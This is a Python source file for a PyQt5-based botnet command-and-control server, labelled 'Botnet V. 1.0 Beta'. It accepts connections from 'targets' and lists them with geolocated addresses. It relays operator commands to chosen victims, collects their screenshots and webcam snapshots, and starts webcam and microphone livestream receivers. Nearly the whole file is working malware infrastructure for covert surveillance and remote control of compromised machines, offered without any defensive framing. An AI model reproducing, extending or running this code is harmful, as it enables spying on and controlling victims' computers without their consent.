import asyncio
import socket
import time
import sys
import os
from PyQt5 import QtWidgets, QtCore, QtGui
from PyQt5.QtGui import QIcon
from PyQt5.uic import loadUi
from pynput.keyboard import Key, Listener, Controller
import threading
import asyncore
import multiprocessing
import struct
import pickle
import cv2
from multiprocessing import Process
import threading
import requests
import json
from bs4 import BeautifulSoup
import locator



""" constants """

VERSION = "Botnet V. 1.0 Beta"
CURRENT_FOLDER = os.path.dirname(os.path.realpath(__file__))
HOST = socket.gethostname()
PORT = 8080

""" globals """

keyboard = Controller()
ip = ""
connections = {}
window = None
video_thread = None



""" PYQT5 Gui Class """

class MyMainWindow(QtWidgets.QMainWindow):
    
    def __init__(self):
        global ip
        super(MyMainWindow, self).__init__()
        loadUi("cmd-frontend.ui", self)
        self.setWindowTitle("Botnet")
        self.setFixedSize(690, 540)
        self.setWindowIcon(QIcon('icon.png'))

        try:
            r = requests.get('https://api.ipify.org?format=json', timeout=15)
            content = r.content
            content = content.decode("Cp1252")
            content = json.loads(content)
            ip_address = content["ip"]
            ip = ip_address
            self.Output.clear()
            self.Output.addItem(f"{VERSION} \t\t\t\t\t          {ip}")
        except Exception as e:
            print("Could not retrieve Users IP!")

    
    """ GUI method for retrieving commands """

    def get_command(self):
        global video_thread, ip

        def on_press(key):
            global video_thread

            if str(key) == "Key.enter":
                command = self.Input.text()
                if command == "ip" or command == "get ip":
                    self.Output.addItem(f"Current IP: {ip}")
                elif command == "clear":
                    self.Output.clear()
                    self.Input.clear()
                    self.Output.addItem(f"{VERSION} \t\t\t\t\t          {ip}")
                elif command == "quit" or command == "exit":
                    self.hide()
                elif command.split(" ")[0] == "echo":
                    output_text = " ".join(command.split(" ")[1:])
                    self.Output.addItem(output_text)
                    self.Input.clear()
                elif command == "show_clients" or command == "show clients" or command == "sc":
                    active_connections = "\n".join(f"{key}\t\t{connections[key].addr}\t\t{locator.get_location(connections[key].addr[0])}" for key in connections.keys())
                    self.Output.addItem(f"\nID\t\t       Address\t\t\t   Location\n\n{active_connections}")
                    self.Input.clear()
                elif "@" in command:  

                    try:
                        print(connections)
                        receiver = command.split("@")[0]
                        receiver = connections[int(receiver)]
                        print(f"RECEIVER: {receiver}")
                        receiver.send(command.split("@")[1].encode("utf-8"))
                        self.Input.clear()
                    except Exception as error:
                        print(error)
                        self.Output.addItem("[ ! ] ERROR Client not found.")

        with Listener(on_press=on_press) as listener:
            listener.join()



""" Class for handling asynchronous TCP-connections """

class ConnectionHandler(asyncore.dispatcher_with_send):

    receiving_screenshot = False
    receiving_livefeed = False
    receiving_snapshot = False

    def __init__(self, sock, window, iD):
        asyncore.dispatcher_with_send.__init__(self, sock)
        self.window = window
        self.id = iD
        self.screenshot_number = 1
        self.snapshot_number = 1
    
    def video_stream():
        os.system("python webcam-host.py")

    def audio_stream():
        os.system("python microphone-host.py")
        
    def handle_read(self):
        global video_thread


        if ConnectionHandler.receiving_snapshot:
            data = self.recv(609600)
            image_name = f"snapshot_NUM{self.snapshot_number}.png"

            if not f"webcam{self.id}" in os.listdir():
                os.mkdir(f"webcam{self.id}")

            with open(f"webcam{self.id}/{image_name}", "wb") as file:
                file.write(data)

            self.snapshot_number += 1
            saved_image_path = os.path.join(CURRENT_FOLDER, image_name)
            self.window.Output.addItem(f"\n{time.strftime('%H:%M:%S')} Snapshot saved to: {saved_image_path}")
            ConnectionHandler.receiving_snapshot = False
        
        elif ConnectionHandler.receiving_screenshot:
            data = self.recv(609600)
            image_name = f"Screenshot_ID{self.id}_NUM{self.screenshot_number}.png"

            if not f"screenshots{self.id}" in os.listdir():
                os.mkdir(f"screenshots{self.id}")

            with open(f"screenshots{self.id}/{image_name}", "wb") as file:
                file.write(data)
        
            self.screenshot_number += 1
            saved_image_path = os.path.join(CURRENT_FOLDER, image_name)
            self.window.Output.addItem(f"\n{time.strftime('%H:%M:%S')} Screenshot saved to: {saved_image_path}")
            ConnectionHandler.receiving_screenshot = False
       
        else:
            data = self.recv(8096).decode("Cp1252")
            if data == "Taken Screenshot":
                ConnectionHandler.receiving_screenshot = True
            if data == "Taken Snapshot":
                ConnectionHandler.receiving_snapshot = True
            elif data == "STARTING LIVESTREAM":
                video_thread = threading.Thread(target=ConnectionHandler.video_stream)
                video_thread.start()
            elif data == "STARTING AUDIOSTREAM":
                audio_thread = threading.Thread(target=ConnectionHandler.audio_stream)
                audio_thread.start()
            elif data != "":
                self.window.Output.addItem(f"\n{time.strftime('%H:%M:%S')} {data}")

    def handle_close(self):
        self.close()
        connections.pop(self.id)
        self.window.Output.addItem(f"{time.strftime('%H:%M:%S')}  Target {repr(self.addr)} disconnected from the server.")

    def handle_expt(self):
        self.close()
        connections.pop(self.id)
        self.window.Output.addItem(f"{time.strftime('%H:%M:%S')}  Target {repr(self.addr)} lost connection to the server.")




""" Asynchronous Server class """
 
class Server(asyncore.dispatcher):

    client_number = 0

    def __init__(self, host, port, window):
        asyncore.dispatcher.__init__(self)
        self.create_socket()
        self.set_reuse_addr()
        self.bind((host, port))
        self.window = window
        self.listen(5)

    def handle_accepted(self, sock, addr):
        self.window.Output.addItem(f"{time.strftime('%H:%M:%S')}  Target {repr(addr)} connected to the server.")
        Server.client_number += 1
        connection = ConnectionHandler(sock, self.window, Server.client_number)
        connections[Server.client_number] = connection

  
def show_window():
    global window
    print("Showing window...")
    application = QtWidgets.QApplication(sys.argv)
    window = MyMainWindow()
    threading.Thread(target=window.get_command).start()
    window.show()
    sys.exit(application.exec_())


def main():
    threading.Thread(target=show_window).start()
    time.sleep(2)
    server = Server(HOST, PORT, window)
    print("Server running!")
    asyncore.loop()

if __name__ == "__main__":
    main()
    





